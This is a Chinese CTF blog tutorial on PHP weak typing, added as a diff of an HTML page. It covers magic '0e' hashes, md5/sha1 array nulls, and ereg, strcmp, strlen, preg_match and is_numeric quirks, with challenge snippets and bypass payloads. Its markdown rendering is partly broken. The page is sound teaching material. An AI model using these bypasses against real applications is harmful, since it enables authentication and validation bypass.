@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="PHP弱类型 php是一门弱类型语音，不需要声明变量的类型，会根据变量的值自动把转换成正确的类型。 数字比较缺陷 （类型强制转换） PHP中==和===的区别。 == 会先将变量转换成相同类型，再去比较 === 会先比较变量的类型，再去比较值 数值和字符串或涉及到数字的字符串比较时，会将字符串转换成数字 ```php 1 &lt;?php 2 var_dump(&#34;admin&#34;==0);...">
+        <meta name="keywords" content="PHP">
+        <link rel="icon" href="/favicon.ico">
+
+        <title>PHP弱类型 - Czj's 博客</title>
+
+        <!-- Stylesheets -->
+        <link href="/theme/css/all.min.css" rel="stylesheet">
+        <!-- /Stylesheets -->
+
+        <!-- RSS Feeds -->
+        <!-- /RSS Feeds -->
+
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+    </head>
+
+    <body>
+
+        <!-- Header -->
+    <div class="header-container" style="background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('/images/abc.jpg'); background-position: center; background-size: cover;">
+
+            <!-- Static navbar -->
+            <div class="container">
+                <div class="header-nav">
+                    <div class="header-logo">
+                        <a class="pull-left" href="/">MyBlog</a>
+                    </div>
+                    <div class="nav pull-right">
+                                <a href="/">首页</a>
+                                <a href="/categories.html">分类</a>
+                                <a href="/tags.html">标签</a>
+                    </div>
+                </div>
+            </div>
+            <!-- /Static navbar -->
+
+            <!-- Header -->
+    <!-- Header -->
+    <div class="container header-wrapper">
+        <div class="row">
+              <div class="col-lg-12">
+                  <div class="header-content">
+                      <h1 class="header-title">PHP弱类型</h1>
+                      <p class="header-date">By <a href="/author/czj.html">Czj</a>, 2019-09-23, 分类:  <a href="/category/ctf.html">Ctf</a></p>
+                      <div class="header-underline"></div>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="/tag/php.html">PHP</a>                      </p>
+                  </div>
+              </div>
+        </div>
+    </div>
+    <!-- /Header -->
+            <!-- /Header -->
+
+        </div>
+        <!-- /Header -->
+
+
+        <!-- Content -->
+    <div class="container content">
+        <h1>PHP弱类型</h1>
+<p>php是一门弱类型语音，不需要声明变量的类型，会根据变量的值自动把转换成正确的类型。</p>
+<h2>数字比较缺陷 （类型强制转换）</h2>
+<p>PHP中==和===的区别。</p>
+<p>== 会先将变量转换成相同类型，再去比较</p>
+<p>=== 会先比较变量的类型，再去比较值</p>
+<p>数值和字符串或涉及到数字的字符串比较时，会将字符串转换成数字</p>
+<p>```php 
+1 &lt;?php
+2 var_dump("admin"==0);  //true
+3 var_dump("1admin"==1); //true
+4 var_dump("admin1"==1) //false
+5 var_dump("admin1"==0) //true
+6 var_dump("0e123456"=="0e4456789"); //true 
+7 ?&gt;  //上述代码可自行测试</p>
+<div class="highlight"><pre><span></span>
+</pre></div>
+
+
+<p>1 == '1abc' // true
+true == 'abcd'  // true 
+"42" == "42.0" // true
+"42" == "000042.00" // true
+"42" == "0x000000002A" // true
+"10" == "1e1" // true
+"42" == "0000000004.2E+1" // true
+"42" == "42.0e+000000" // true</p>
+<p>[false] == [0] == [NULL] == ['']
+NULL == false == 0</p>
+<div class="highlight"><pre><span></span><span class="o">```</span><span class="n">php</span>
+<span class="s1">&#39;0.999999999999999999999&#39;</span> <span class="o">==</span> <span class="mi">1</span>
+
+<span class="o">#</span> <span class="k">true</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="o">+</span>
+<span class="s1">&#39;0e0&#39;</span> <span class="o">==</span> <span class="s1">&#39;0e1&#39;</span>
+<span class="s1">&#39;0e0&#39;</span> <span class="o">==</span> <span class="s1">&#39;0E1&#39;</span>
+<span class="s1">&#39;10e2&#39;</span> <span class="o">==</span> <span class="s1">&#39; 01e3&#39;</span>
+<span class="s1">&#39;10e2&#39;</span> <span class="o">==</span> <span class="s1">&#39;01e3&#39;</span>
+<span class="s1">&#39;10e2&#39;</span> <span class="o">==</span> <span class="s1">&#39;1e3&#39;</span>
+<span class="s1">&#39;010e2&#39;</span> <span class="o">==</span> <span class="s1">&#39;1e3&#39;</span>
+<span class="s1">&#39;010e2&#39;</span> <span class="o">==</span> <span class="s1">&#39;01e3&#39;</span>
+<span class="s1">&#39;10&#39;</span> <span class="o">==</span> <span class="s1">&#39;010&#39;</span>
+<span class="s1">&#39;10.0&#39;</span> <span class="o">==</span> <span class="s1">&#39;10&#39;</span>
+<span class="s1">&#39;10&#39;</span> <span class="o">==</span> <span class="s1">&#39;00000000010&#39;</span>
+<span class="s1">&#39;12345678&#39;</span> <span class="o">==</span> <span class="s1">&#39;00000000012345678&#39;</span>
+<span class="s1">&#39;0010e2&#39;</span> <span class="o">==</span> <span class="s1">&#39;1e3&#39;</span>
+<span class="s1">&#39;123000&#39;</span> <span class="o">==</span> <span class="s1">&#39;123e3&#39;</span>
+<span class="s1">&#39;123000e2&#39;</span> <span class="o">==</span> <span class="s1">&#39;123e5&#39;</span>
+
+<span class="o">#</span> <span class="k">true</span> <span class="k">in</span> <span class="mi">5</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span><span class="o">+</span>
+<span class="o">#</span> <span class="k">false</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span>
+<span class="s1">&#39;608E-4234&#39;</span> <span class="o">==</span> <span class="s1">&#39;272E-3063&#39;</span>
+
+<span class="o">#</span> <span class="k">true</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="n">x</span>
+<span class="o">#</span> <span class="k">false</span> <span class="k">in</span> <span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">+</span>
+<span class="s1">&#39;0e0&#39;</span> <span class="o">==</span> <span class="s1">&#39;0x0&#39;</span>
+<span class="s1">&#39;0xABC&#39;</span> <span class="o">==</span> <span class="s1">&#39;0xabc&#39;</span>
+<span class="s1">&#39;0xABCdef&#39;</span> <span class="o">==</span> <span class="s1">&#39;0xabcDEF&#39;</span>
+<span class="s1">&#39;000000e1&#39;</span> <span class="o">==</span> <span class="s1">&#39;0x000000&#39;</span>
+<span class="s1">&#39;0xABFe1&#39;</span> <span class="o">==</span> <span class="s1">&#39;0xABFE1&#39;</span>
+<span class="s1">&#39;0xe&#39;</span> <span class="o">==</span> <span class="s1">&#39;0Xe&#39;</span>
+<span class="s1">&#39;0xABCDEF&#39;</span> <span class="o">==</span> <span class="s1">&#39;11259375&#39;</span>
+<span class="s1">&#39;0xABCDEF123&#39;</span> <span class="o">==</span> <span class="s1">&#39;46118400291&#39;</span>
+<span class="s1">&#39;0x1234AB&#39;</span> <span class="o">==</span> <span class="s1">&#39;1193131&#39;</span>
+<span class="s1">&#39;0x1234Ab&#39;</span> <span class="o">==</span> <span class="s1">&#39;1193131&#39;</span>
+
+<span class="o">#</span> <span class="k">true</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="n">x</span>
+<span class="o">#</span> <span class="k">false</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">10</span> <span class="o">-</span> <span class="mi">4</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">+</span>
+<span class="s1">&#39;0xABCdef&#39;</span> <span class="o">==</span> <span class="s1">&#39; 0xabcDEF&#39;</span>
+<span class="s1">&#39;1e1&#39;</span> <span class="o">==</span> <span class="s1">&#39;0xa&#39;</span>
+<span class="s1">&#39;0xe&#39;</span> <span class="o">==</span> <span class="s1">&#39; 0Xe&#39;</span>
+<span class="s1">&#39;0x123&#39;</span> <span class="o">==</span> <span class="s1">&#39; 0x123&#39;</span>
+
+<span class="o">#</span> <span class="k">true</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">10</span> <span class="o">-</span> <span class="mi">4</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span>
+<span class="o">#</span> <span class="k">false</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">26</span><span class="p">,</span> <span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">+</span>
+<span class="s1">&#39;0e0&#39;</span> <span class="o">==</span> <span class="s1">&#39;0x0a&#39;</span>
+
+<span class="o">#</span> <span class="k">true</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span>
+<span class="o">#</span> <span class="k">false</span> <span class="k">in</span> <span class="n">PHP</span> <span class="mi">4</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">10</span> <span class="o">-</span> <span class="mi">4</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span> <span class="o">-</span> <span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">26</span><span class="p">,</span> <span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">+</span>
+<span class="s1">&#39;0xe&#39;</span> <span class="o">==</span> <span class="s1">&#39; 0Xe.&#39;</span>
+</pre></div>
+
+
+<p>Php会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
+<h2>缺陷类型</h2>
+<h3>哈希比较</h3>
+<table>
+<thead>
+<tr>
+<th align="left">源字符串</th>
+<th align="left">MD5值(32位)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">s878926199a</td>
+<td align="left">0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td align="left">s155964671a</td>
+<td align="left">0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td align="left">s214587387a</td>
+<td align="left">0e848240448830537924465865611904</td>
+</tr>
+<tr>
+<td align="left">s214587387a</td>
+<td align="left">0e848240448830537924465865611904</td>
+</tr>
+<tr>
+<td align="left">s878926199a</td>
+<td align="left">0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td align="left">s1091221200a</td>
+<td align="left">0e940624217856561557816327384675</td>
+</tr>
+<tr>
+<td align="left">s1885207154a</td>
+<td align="left">0e509367213418206700842008763514</td>
+</tr>
+<tr>
+<td align="left">s1502113478a</td>
+<td align="left">0e861580163291561247404381396064</td>
+</tr>
+<tr>
+<td align="left">s1885207154a</td>
+<td align="left">0e509367213418206700842008763514</td>
+</tr>
+<tr>
+<td align="left">s1836677006a</td>
+<td align="left">0e481036490867661113260034900752</td>
+</tr>
+<tr>
+<td align="left">s155964671a</td>
+<td align="left">0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td align="left">s1184209335a</td>
+<td align="left">0e072485820392773389523109082030</td>
+</tr>
+<tr>
+<td align="left">s1665632922a</td>
+<td align="left">0e731198061491163073197128363787</td>
+</tr>
+<tr>
+<td align="left">s1502113478a</td>
+<td align="left">0e861580163291561247404381396064</td>
+</tr>
+<tr>
+<td align="left">s1836677006a</td>
+<td align="left">0e481036490867661113260034900752</td>
+</tr>
+<tr>
+<td align="left">s1091221200a</td>
+<td align="left">0e940624217856561557816327384675</td>
+</tr>
+<tr>
+<td align="left">s155964671a</td>
+<td align="left">0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td align="left">s1502113478a</td>
+<td align="left">0e861580163291561247404381396064</td>
+</tr>
+<tr>
+<td align="left">s155964671a</td>
+<td align="left">0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td align="left">s1665632922a</td>
+<td align="left">0e731198061491163073197128363787</td>
+</tr>
+<tr>
+<td align="left">s155964671a</td>
+<td align="left">0e342768416822451524974117254469</td>
+</tr>
+<tr>
+<td align="left">s1091221200a</td>
+<td align="left">0e940624217856561557816327384675</td>
+</tr>
+<tr>
+<td align="left">s1836677006a</td>
+<td align="left">0e481036490867661113260034900752</td>
+</tr>
+<tr>
+<td align="left">s1885207154a</td>
+<td align="left">0e509367213418206700842008763514</td>
+</tr>
+<tr>
+<td align="left">s532378020a</td>
+<td align="left">0e220463095855511507588041205815</td>
+</tr>
+<tr>
+<td align="left">s878926199a</td>
+<td align="left">0e545993274517709034328855841020</td>
+</tr>
+<tr>
+<td align="left">s1091221200a</td>
+<td align="left">0e940624217856561557816327384675</td>
+</tr>
+<tr>
+<td align="left">s214587387a</td>
+<td align="left">0e848240448830537924465865611904</td>
+</tr>
+<tr>
+<td align="left">s1502113478a</td>
+<td align="left">0e861580163291561247404381396064</td>
+</tr>
+<tr>
+<td align="left">s1091221200a</td>
+<td align="left">0e940624217856561557816327384675</td>
+</tr>
+<tr>
+<td align="left">s1665632922a</td>
+<td align="left">0e731198061491163073197128363787</td>
+</tr>
+<tr>
+<td align="left">s1885207154a</td>
+<td align="left">0e509367213418206700842008763514</td>
+</tr>
+<tr>
+<td align="left">s1836677006a</td>
+<td align="left">0e481036490867661113260034900752</td>
+</tr>
+<tr>
+<td align="left">s1665632922a</td>
+<td align="left">0e731198061491163073197128363787</td>
+</tr>
+<tr>
+<td align="left">s878926199a</td>
+<td align="left">0e545993274517709034328855841020</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th align="left">源字符串</th>
+<th align="left">sha1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">10932435112</td>
+<td align="left">0e07766915004133176347055865026311692244</td>
+</tr>
+<tr>
+<td align="left">aaroZmOk</td>
+<td align="left">0e66507019969427134894567494305185566735</td>
+</tr>
+<tr>
+<td align="left">aaK1STfY</td>
+<td align="left">0e76658526655756207688271159624026011393</td>
+</tr>
+<tr>
+<td align="left">aaO8zKZF</td>
+<td align="left">0e89257456677279068558073954252716165668</td>
+</tr>
+<tr>
+<td align="left">aa3OFF9m</td>
+<td align="left">0e36977786278517984959260394024281014729</td>
+</tr>
+</tbody>
+</table>
+<p>一道经典题目</p>
+<p>```php 
+&lt;?php 
+error_reporting(0); 
+include_once('flag.php'); 
+highlight_file('index.php');  </p>
+<p>$md51 = md5('QNKCDZO'); 
+$a = $_GET['b']; 
+$md52 = md5($a); 
+if(isset($a)){ 
+if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) { 
+    echo $flag; 
+} else { 
+    echo "false!!!"; 
+}}</p>
+<div class="highlight"><pre><span></span><span class="o">###</span> <span class="n">md5和sha1的函数缺陷</span>
+
+<span class="err">这两个函数对数组加密时，会返回一个</span><span class="k">null</span><span class="err">。</span><span class="n">post和get方法传递数组用a</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span>
+
+<span class="p">[</span><span class="err">例题</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">link</span><span class="p">.</span><span class="n">jianshu</span><span class="p">.</span><span class="n">com</span><span class="o">/?</span><span class="n">t</span><span class="o">=</span><span class="n">http</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">%</span><span class="mi">2</span><span class="n">Fchinalover</span><span class="p">.</span><span class="n">sinaapp</span><span class="p">.</span><span class="n">com</span><span class="o">%</span><span class="mi">2</span><span class="n">Fweb17</span><span class="o">%</span><span class="mi">2</span><span class="n">Findex</span><span class="p">.</span><span class="n">php</span><span class="p">)</span>
+
+
+
+<span class="o">###</span> <span class="n">intval</span><span class="p">()</span><span class="err">的缺陷</span>
+
+<span class="o">**</span><span class="n">intval</span><span class="p">()</span><span class="o">**</span> <span class="err">函数通过使用指定的进制</span> <span class="n">base</span> <span class="err">转换（默认是十进制），返回变量</span> <span class="n">var</span> <span class="err">的</span> <span class="nb">integer</span> <span class="err">数值。</span> <span class="n">intval</span><span class="p">()</span> <span class="err">不能用于</span> <span class="k">object</span><span class="err">，否则会产生</span> <span class="n">E_NOTICE</span> <span class="err">错误并返回</span> <span class="mi">1</span><span class="err">。</span>
+
+<span class="o">```</span><span class="n">php</span>
+<span class="n">var_dump</span><span class="p">(</span><span class="n">intval</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">))</span> <span class="o">//</span> <span class="mi">2</span>
+<span class="n">var_dump</span><span class="p">(</span><span class="n">intval</span><span class="p">(</span><span class="s1">&#39;3abcd&#39;</span><span class="p">))</span> <span class="o">//</span> <span class="mi">3</span>
+<span class="n">var_dump</span><span class="p">(</span><span class="n">intval</span><span class="p">(</span><span class="s1">&#39;abcd&#39;</span><span class="p">))</span> <span class="o">//</span> <span class="mi">0</span>
+<span class="n">var_dump</span><span class="p">(</span><span class="n">intval</span><span class="p">(</span><span class="nb">array</span><span class="p">()));</span>                 <span class="o">//</span> <span class="mi">0</span>
+<span class="n">var_dump</span><span class="p">(</span><span class="n">intval</span><span class="p">(</span><span class="nb">array</span><span class="p">(</span><span class="s1">&#39;foo&#39;</span><span class="p">,</span> <span class="s1">&#39;bar&#39;</span><span class="p">));</span>     <span class="o">//</span> <span class="mi">1</span>
+<span class="n">var_dump</span><span class="p">(</span><span class="n">intval</span><span class="p">(</span><span class="s1">&#39;0x23333&#39;</span><span class="p">))</span>  <span class="o">//</span><span class="mi">0</span>
+</pre></div>
+
+
+<h3>strcmp()缺陷</h3>
+<div class="highlight"><pre><span></span><span class="x"> int strcmp ( string $str1 , string $str2 )</span>
+<span class="x">    参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span>
+
+<span class="x">   在php5.3之前，当这个函数接受到了不符合的类型，这个函数将发生错误，显示了报错的警告信息后，将return 0。</span>
+</pre></div>
+
+
+<h3>ereg()，eregi()函数缺陷</h3>
+<p><code>ereg()</code>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回<code>true</code>，否则返回<code>false</code>。搜索对于字母字符是区分大小写的。</p>
+<div class="highlight"><pre><span></span><span class="x">int ereg(string pattern,string originalstring,[arrayregs]);</span>
+</pre></div>
+
+
+<p>ereg函数存在两个漏洞：</p>
+<ul>
+<li>%00截断，在遇到%00的时候会认为字符串结束了</li>
+<li>ereg函数中的参数值如果为数组，会返回false</li>
+</ul>
+<p>eregi跟ereg函数漏洞基本一样，区别在于<strong>ereg区分大小写</strong>(这里划重点，也是可以用来绕过的),eregi函数不区分大小写。</p>
+<p>经典题目</p>
+<p>```php 
+&lt;?php
+if (isset ($_GET['password'])) {
+    if (ereg ("^[a-zA-Z0-9]+$",$_GET['password']) === FALSE)  <br>
+       {
+        echo '<p>You password must be alphanumeric</p>';
+    }
+    else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)
+    {
+        if (strpos ($_GET['password'], '<em>-</em>') != FALSE)
+        {
+            die('Flag: ' . $flag);
+        }
+        else
+        {
+            echo('<p><em>-</em> have not been found</p>');
+        }
+    }
+    else
+    {
+        echo '<p>Invalid password</p>';
+    }
+}
+?&gt;
+附：payload= 1e9%00<em>-</em></p>
+<div class="highlight"><pre><span></span>### <span class="k">strlen</span><span class="ss">()</span>缺陷
+
+这个函数也是<span class="nv">CTF</span>函数黑魔法中的经典函数，自我矛盾。用来进行判断长度，然后结合大小比较来进行出题。
+
+```<span class="nv">php</span>
+<span class="o">&lt;</span>?<span class="nv">php</span>
+@<span class="mh">$a</span> <span class="o">=</span> $<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">num</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+<span class="k">if</span><span class="ss">(</span><span class="k">strlen</span><span class="ss">(</span><span class="mh">$a</span><span class="ss">)</span><span class="o">&lt;</span><span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="mh">$a</span><span class="o">&gt;</span><span class="mi">10000</span><span class="ss">)</span>{
+    <span class="nv">echo</span> <span class="mh">$f</span><span class="nv">lag</span><span class="c1">;</span>
+}
+<span class="k">else</span>{
+    <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">is too small</span><span class="s2">&quot;</span><span class="c1">;</span>
+}
+?<span class="o">&gt;</span>
+
+<span class="mi">1</span><span class="nv">e9</span>
+</pre></div>
+
+
+<h3>preg_match() perg_match_all() 的缺陷</h3>
+<p>先说preg_match()函数，是为了弥补ereg函数的%00截断问题，替换了ereg函数。但是，在CTF中踩了那么多坑以后，终于发现了制裁它的方法，构造数组，就可以了。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$str</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
+<span class="nv">$reg</span> <span class="o">=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/\d/is&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>    <span class="c1">//有0-9的数字 和.在内的符号</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$reg</span> <span class="o">!==</span> <span class="mi">1</span> <span class="k">and</span> <span class="nv">$str</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="s1">&#39;Flag&#39;</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&quot;no&quot;</span><span class="p">;</span>
+<span class="p">}</span><span class="c1">// 最终输出了Flag</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">payload: a[]=1</span>
+</pre></div>
+
+
+<p>preg_match()函数还存在另一个问题，preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题。</p>
+<p>```php 
+&lt;?php
+$ip = $_GET['ip']; // 可以绕过
+if(!preg_match("/(\d+).(\d+).(\d+).(\d+)/",$ip)) {
+  die('error');
+} else {
+  echo "Flag";
+}
+?&gt;// Flag</p>
+<p>payload: ip=127.0.0.1  abcdef</p>
+<div class="highlight"><pre><span></span>###  <span class="nv">is_numberic</span><span class="ss">()</span> 和 <span class="nv">trim</span><span class="ss">()</span> 函数的缺陷
+
+<span class="nv">is_numberic</span><span class="ss">()</span> 检测变量是否是数字和数字字符串，返回<span class="nv">true</span>或<span class="nv">false</span>
+
+同时它默认<span class="mi">16</span>进制的字符串也为整型
+
+```<span class="nv">php</span>
+<span class="mi">16</span>进制的<span class="nv">abc</span><span class="o">=</span><span class="mi">0</span><span class="nv">x616263</span>
+<span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="nv">header</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">content-type:text/html;charset=utf-8</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
+<span class="mh">$a</span><span class="o">=</span>$<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">num</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+<span class="nv">var_dump</span><span class="ss">(</span><span class="mh">$a</span><span class="ss">)</span><span class="c1">;</span>
+<span class="k">if</span><span class="ss">(</span><span class="nv">is_numeric</span><span class="ss">(</span><span class="mh">$a</span><span class="ss">))</span>{
+    <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">您输入的是数字</span><span class="s2">&quot;</span><span class="c1">;</span>
+}<span class="k">else</span>{
+    <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">请输入合法字符</span><span class="s2">&quot;</span><span class="c1">;</span>
+}
+?<span class="o">&gt;</span>
+
+是数字
+
+
+<span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="nv">echo</span> <span class="nv">is_numeric</span><span class="ss">(</span><span class="mi">233333</span><span class="ss">)</span><span class="c1">;       // 1</span>
+<span class="nv">echo</span> <span class="nv">is_numeric</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">233333</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;    // 1</span>
+<span class="nv">echo</span> <span class="nv">is_numeric</span><span class="ss">(</span><span class="mi">0</span><span class="nv">x233333</span><span class="ss">)</span><span class="c1">;    // 1</span>
+<span class="nv">echo</span> <span class="nv">is_numeric</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">0x233333</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;    // 1</span>
+<span class="nv">echo</span> <span class="nv">is_numeric</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">9e9</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;   // 1</span>
+<span class="nv">echo</span> <span class="nv">is_numeric</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">233333abc</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;  // 0</span>
+?<span class="o">&gt;</span>
+</pre></div>
+
+
+<p>trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f</p>
+<div class="highlight"><pre><span></span><span class="x">$a = &quot;  \n\r\t\v\0abc  \f&quot;;</span>
+<span class="x">var_dump(trim($a)); // abc  \f</span>
+</pre></div>
+
+
+<p>具体实现</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="c1">// %0c1%00</span>
+    <span class="nv">$number</span> <span class="o">=</span> <span class="s2">&quot;\f1</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">;</span>
+    <span class="c1">// trim 函数会过滤 \n\r\t\v\0，但不会过滤过滤\f</span>
+    <span class="nv">$number_2</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$number</span><span class="p">);</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$number_2</span><span class="p">);</span> <span class="c1">// \f1</span>
+    <span class="nv">$number_2</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$number_2</span><span class="p">);</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$number_2</span><span class="p">);</span>  <span class="c1">// \f1</span>
+    <span class="c1">// is_numeric 检测的时候会过滤掉 &#39;&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;, &#39;\v&#39;, &#39;\f&#39; 等字符</span>
+    <span class="c1">// 但是不会过滤 &#39;\0&#39;</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$number</span><span class="p">));</span> <span class="c1">// false</span>
